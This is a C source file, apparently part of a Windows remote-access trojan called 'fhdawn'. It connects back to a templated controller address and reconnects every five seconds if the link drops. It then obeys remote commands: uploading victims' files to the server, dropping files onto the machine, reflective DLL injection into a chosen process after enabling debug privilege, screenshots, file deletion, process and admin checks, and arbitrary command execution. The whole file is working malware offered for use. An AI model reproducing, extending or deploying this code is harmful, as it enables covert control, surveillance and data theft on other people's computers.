/*
Author: Fahad (QuantumCore)
connect.c (c) 2020
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/

#include "fhdawn.h"
#include "FileTunnel.h"
#include "LoadLibraryR.h"

int fsize = 0;
char* fileinfo[3];
char temp[BUFFER]; // Temporary buffer to receive file information

TOKEN_PRIVILEGES priv = { 0 };
HANDLE hModule = NULL;
HANDLE hProcess = NULL;
HANDLE hToken = NULL;


#define BREAK_WITH_ERROR( e ) { sockprintf(sockfd, "[-] %s. Error=%ld", e, GetLastError() ); break; }


// By @augustgl (github.com/augustgl)
void sockprintf(SOCKET sock, const char* words, ...) {
    static char textBuffer[BUFFER];
    memset(textBuffer, '\0', BUFFER);
    va_list args;
    va_start(args, words);
    vsprintf(textBuffer, words, args);
    va_end(args);
    sockSend(textBuffer);
    // return send(sock, textBuffer, strlen(textBuffer), 0); // see, it's printf but for a socket. instead of printing, at the end it's a send()
}

void REConnect(void)
{
    closesocket(sockfd);
    WSACleanup();
    Sleep(5000);
    MainConnect();
}

void sockSend(const char* data)
{
    int lerror = WSAGetLastError();
    int totalsent = 0;
    int buflen = strlen(data);
    while (buflen > totalsent) {
        int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
        if (lerror == WSAECONNRESET)
        {
            connected = FALSE;
        }
        if (r < 0) return;
        totalsent += r;
    }
    return;
}

void fhdawn_main(void)
{
    while (connected)
    {
        memset(recvbuf, '\0', BUFFER);
        int return_code = recv(sockfd, recvbuf, BUFFER, 0);
        if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
        {
            connected = FALSE;
        }
        // Check Host, Get mac
        if (strcmp(recvbuf, "checkhost") == 0)
        {
            memset(recvbuf, '\0', BUFFER);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }
            CheckHost(recvbuf);

        }

        else if (strcmp(recvbuf, "gethostname") == 0){
            memset(recvbuf, '\0', BUFFER);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }
            sockprintf(sockfd, "%s - %s", recvbuf, IP2Host(recvbuf));
        }

        else if(strcmp(recvbuf, "checkport") == 0)
        {
            memset(recvbuf, '\0', BUFFER);
            memset(fileinfo, '\0', 2);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }
            split(recvbuf, fileinfo, ",");
            checkPort(fileinfo[0], atoi(fileinfo[1]));
        }
        // Receive file from server
        else if (strcmp(recvbuf, "frecv") == 0) // frecv (file recv) / recv file from server 
        {

            int expected = 0; // expected bytes of size
            DWORD dwBytesWritten = 0; // number of bytes written
            BOOL write; // Return value of WriteFile();
            memset(temp, '\0', BUFFER); // Clear temp
            memset(fileinfo, '\0', 2);
            int return_code = recv(sockfd, temp, BUFFER, 0); // Receive File information from server (filename:filesize)
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }
            split(temp, fileinfo, ":"); // split the received string with ':' delimeter. So at index 0, There is filename, And at index 1, There is filesize.
            expected = atoi(fileinfo[1]); // Convert filesize to integer. Filesize is the expected file size.
            // Create file.
            HANDLE recvfile = CreateFile(fileinfo[0], FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (recvfile == INVALID_HANDLE_VALUE) {
                sockprintf(sockfd, "[Error Creating File] : %ld", GetLastError());
            }
            else {
                memset(recvbuf, '\0', BUFFER); // Clear main buffer
                int total = 0; // Total bytes received

                do { // IF Total is equal to expected bytes. Break the loop, And stop receiving.
                    fsize = recv(sockfd, recvbuf, BUFFER, 0); // Receive file
                    if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                    {
                        connected = FALSE;
                        printf("[X] Connection interrupted while receiving file %s for %s size.", fileinfo[0], fileinfo[1]);
                    }
                    else if (fsize == 0) {
                        break;
                    }
                    else {
                        write = WriteFile(recvfile, recvbuf, fsize, &dwBytesWritten, NULL); // Write file data to file
                        total += fsize; // Add number of bytes received to total.
                    }
                } while (total != expected);

                if (write == FALSE)
                {
                    sockprintf(sockfd, "[Error Writing file %s of %s size] Error : %ld.", fileinfo[0], fileinfo[1], GetLastError());
                }
                else {
                    // sockprintf(sockfd, "\n[ Received File : %s ]\n[ File Size : %s bytes ]\n[ Bytes written : %ld ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
                    // sockprintf(sockfd, "\n[ Saved File : %s ]\n[ File Size : %i bytes ]\n", fileinfo[0], total);
                    sockprintf(
                        sockfd,
                        "F_OK,%s,%i,%s\\%s",
                        fileinfo[0],
                        total,
                        cDir(),
                        fileinfo[0]
                    );
                }
                CloseHandle(recvfile);
            }
        }
        // Reflective DLL Injection over socket
        else if (strcmp(recvbuf, "fdll") == 0)
        {

            memset(temp, '\0', BUFFER);
            int return_code = recv(sockfd, temp, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                break;
            }
            split(temp, fileinfo, ":");
            int expected = atoi(fileinfo[1]);
            DWORD dwProcessId = ProcessId(fileinfo[2]);
            unsigned char* DLL = HeapAlloc(GetProcessHeap(), 0, expected + 1);

            memset(recvbuf, '\0', BUFFER);
            ZeroMemory(DLL, expected + 1);
            int total = 0;

            do {
                fsize = recv(sockfd, recvbuf, BUFFER, 0);
                if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = FALSE;
                    // printf("[X] Connection interrupted while receiving DLL\n");
                }
                else if (fsize == 0) {
                    break;
                }
                else {
                    memcpy(DLL + total, recvbuf, fsize);
                    total += fsize;
                }
            } while (total != expected);

            do {
                if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
                {
                    priv.PrivilegeCount = 1;
                    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
                        AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);

                    CloseHandle(hToken);
                }

                hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
                if (!hProcess)
                    BREAK_WITH_ERROR("Failed to open the target process");

                hModule = LoadRemoteLibraryR(hProcess, DLL, expected + 1, NULL);
                if (!hModule)
                    BREAK_WITH_ERROR("Failed to inject the DLL");

                WaitForSingleObject(hModule, -1);
                sockprintf(sockfd, "DLL_OK:%ld", dwProcessId);
            } while (0);

            if (DLL)
            {
                HeapFree(GetProcessHeap(), 0, DLL);

            }
            if (hProcess)
            {
                CloseHandle(hProcess);
            }

        }
        // Upload File to Server
        else if (strstr(recvbuf, "fupload") != NULL)
        {
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, ":");
            
            int bytes_read;
            BOOL upload = TRUE;
            FILE* fs;
           
            do {

                for (int i = 0; i < 2; i++) {
                    if (*fileinfo[i] == '\0')
                    {
                        sockprintf(sockfd, "[ Invalid File Download Request ]\n");
                        upload = FALSE;
                        break;
                    }
                }

                // I'm using fopen instead of GetFileSizeEx because this is much easier for me and this works
                // IF you'd like to update this, fork and make a pull request, I will happily accept
                if (upload) {
                    if ((fs = fopen(fileinfo[1], "rb")) != NULL)
                    {
                        fseek(fs, 0L, SEEK_END);
                        long filesize = ftell(fs);
                        fseek(fs, 0, SEEK_SET);

                        if(filesize <= 0){
                            sockprintf(sockfd, "File '%s' is of 0 bytes.", fileinfo[1]);
                            fclose(fs);
                            upload = FALSE;
                            break;
                        }

                        sockprintf(sockfd, "FILE:%s:%ld", fileinfo[1], filesize);
                        Sleep(1000);
                        char fbuffer[500];
                        memset(fbuffer, '\0', 500);
                        while (!feof(fs)) {
                            if ((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0) {
                                send(sockfd, fbuffer, bytes_read, 0);
                            }
                            else {
                                upload = FALSE;
                                break;
                            }
                        }
                        fclose(fs);
                    }

                    else {
                        sockprintf(sockfd, "[ Error Opening file %s (Error %ld) ]", fileinfo[1], GetLastError());
                    }
                }
                // important
                upload = FALSE;

            } while (upload);
            
        }
        // send user / pc
        else if (strcmp(recvbuf, "fhdawn_host") == 0)
        {
            UserPC();
        }
        // list files in current directory
        else if (strcmp(recvbuf, "listdir") == 0)
        {
            WIN32_FIND_DATA data;
            HANDLE hFind;
            hFind = FindFirstFile("*", &data);  
            int i = 0;
            char dir[BUFFER];
            if (hFind != INVALID_HANDLE_VALUE)
            {
                memset(dir, 0, BUFFER);
                snprintf(dir, BUFFER, "Listing '%s'\n-------------------\n", cDir());
                do {
                    int len = strlen(dir);
                    if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                        snprintf(dir + len, sizeof(dir) - len, "[DIRECTORY] %s\n", data.cFileName);
                    }
                    else {
                        ULONGLONG FileSize = data.nFileSizeHigh;
                        FileSize <<= sizeof(data.nFileSizeHigh) * 8;
                        FileSize |= data.nFileSizeLow;
                        snprintf(dir + len, sizeof(dir) - len, "[FILE] %s (%u bytes)\n", data.cFileName, FileSize);
                    }
                } while (FindNextFile(hFind, &data));

                sockSend(dir);
            }
        } 
        // return dll output
        else if (strcmp(recvbuf, "dlloutput") == 0)
        {
            sockSend(GetInputOutput());
        }
        // change directory
        else if (strcmp(recvbuf, "cd") == 0)
        {
            memset(recvbuf, '\0', BUFFER);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }

            if (!SetCurrentDirectory(recvbuf))
            {
                int x = GetLastError(); // Should this be integer?
                // on line 22 I'm using %ld to print the error, it works, What??
                switch (x) {
                case 2:
                    sockprintf(sockfd, "Error Changing Directory, File or Folder not Found (Error code %i)", x);
                    break;
                case 3:
                    sockprintf(sockfd, "Error Changing Directory, Path not found (Error Code %i)", x);
                    break;
                case 5:
                    sockprintf(sockfd, "Error Changing Directory, Access Denied (Error Code %i)", x);
                    break;
                default:
                    sockprintf(sockfd, "Error Changing Directory, Error %i", x);
                    break;
                }  
            }
            else {
                sockprintf(sockfd, "Directory Changed to '%s'", cDir());
            }
        } 
        
        // delete file
        else if (strstr(recvbuf, "delete") != NULL)
        {
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, ":");
            if (isFile(fileinfo[1]))
            {
                if (DeleteFile(fileinfo[1]))
                {
                    sockprintf(sockfd, "DEL_OK,%s,%s", fileinfo[1], cDir());
                }
                else {
                    sockprintf(sockfd, "Error Deleting file : %i", GetLastError());
                }
                
            }
            else {
                sockprintf(sockfd, "File '%s' does not exist.", fileinfo[1]);
            }
        }

        // Capture screenshot
        else if (strcmp(recvbuf, "screenshot") == 0) {
            CaptureAnImage(GetDesktopWindow());
        }
        
        // Send process info
        else if (strstr(recvbuf, "psinfo") != NULL)
        {
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, ":");
            char FILEPATH[BUFFER];
            memset(FILEPATH, '\0', BUFFER);
            DWORD pid = ProcessId(fileinfo[1]);
            HANDLE procHandle;
            if (pid != 0)
            {
                procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
                if (procHandle != NULL) {
                    if (GetModuleFileNameEx(procHandle, NULL, FILEPATH, MAX_PATH) != 0)
                    {
                        // Send Process name, pid, and path back
                        sockprintf(sockfd, "PROCESS,%s,%ld,%s", fileinfo[1], pid, FILEPATH);
                    }
                    else {
                        sockprintf(sockfd, "PROCESS,%s,%ld,(error : %ld)", fileinfo[1], pid, GetLastError());
                    }
                    CloseHandle(procHandle);
                }
                else {
                    sockprintf(sockfd, "Failed to open Process : %s", fileinfo[1]);
                }
            }
            else {
                sockprintf(sockfd, "Process not running.");
            }
        }

        // Send admin status

        else if (strcmp(recvbuf, "isadmin") == 0)
        {
            if (IsAdmin())
            {
                sockprintf(sockfd, "ADMIN:TRUE");
            }
            else {
                sockprintf(sockfd, "ADMIN:FALSE");
            }

        } 

        // Send WAN IP Address, last command

        else if (strcmp(recvbuf, "wanip") == 0)
        {   
            char* wanip[BUFFER];
            HINTERNET hInternet, hFile;
            DWORD rSize;
            if(InternetCheckConnection("http://www.google.com", 1, 0)){
                memset(wanip, '\0', BUFFER);
                hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
                hFile = InternetOpenUrl(hInternet, "http://bot.whatismyipaddress.com/", NULL, 0, INTERNET_FLAG_RELOAD, 0);
                InternetReadFile(hFile, &wanip, sizeof(wanip), &rSize);
                wanip[rSize] = '\0';

                InternetCloseHandle(hFile);
                InternetCloseHandle(hInternet);
                sockprintf(sockfd, "WANIP:%s", wanip);
            } else {
                sockprintf(sockfd, "No Internet Connection detected ...");
            }
        }

        else if (strcmp(recvbuf, "fhdawnpid") == 0){
            sockprintf(sockfd, "FHDAWNPID:%s", FhdawnInfo());
        }

        else {
            ExecSock();
        }

    }

    if (!connected)
    {
        REConnect();
    }
}

void StartWSA(void)
{
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[Error] Error Starting Winsock.");
        WSAReportError();
    }
}


void MainConnect(void)
{
    StartWSA();
    sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    //sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
    {
        printf("Socket Creation Error. ");

        WSAReportError();
        exit(1);
    }

    server.sin_addr.s_addr = inet_addr("{{serverhost}}");
    server.sin_port = htons({{serverport}});

//     server.sin_addr.s_addr = inet_addr("{{serverhost}}");
//    server.sin_port = htons({{serverport}});
    server.sin_family = AF_INET;

    do {
        if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            REConnect();
        }
        else {
            connected = TRUE;
        }
    } while (!connected);

    fhdawn_main();
}